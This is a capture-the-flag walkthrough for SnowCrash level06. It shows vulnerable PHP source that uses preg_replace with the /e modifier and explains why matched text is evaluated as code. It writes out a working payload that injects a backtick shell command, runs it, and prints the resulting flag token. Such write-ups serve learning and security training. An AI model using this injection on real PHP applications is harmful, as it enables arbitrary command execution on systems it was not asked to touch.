lets use cat to display the content of level06.php, which is the source code of the executable level06
cat level06.php
#!/usr/bin/php
<?php
function y($m) {
    $m = preg_replace("/\./", " x ", $m); 
    $m = preg_replace("/@/", " y", $m); 
    return $m; 
}
function x($y, $z) { 
    $a = file_get_contents($y); 
    $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); 
    $a = preg_replace("/\[/", "(", $a); 
    $a = preg_replace("/\]/", ")", $a); 
    return $a; 
}
$r = x($argv[1], $argv[2]); 
print $r;
?>


this program takes in two arguments and passes them to the function named x
it uses file_get_contents to open a file whos name is the first argument
then it uses preg_replace to look for this regex pattern (\[x (.*)\]) , this pattern matchs an open bracket letter x , space and anything that comes after, then a closing bracket, 
example
[x hello world]
first group is 
[x hello world]
second group is 
hello world
it passes the second matched group to a function called y, because this function uses the /e identifier, it can pass the matched pattern to a function,  this by the way is depricated because of a security exploit since the passed in string gets evaluated and treated as php code

lets create a file named foo and type this in it
[x ${`getflag > /tmp/ok`}]

now lets execute 
./level06 foo hi

level06@SnowCrash:~$ cat /tmp/ok
Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub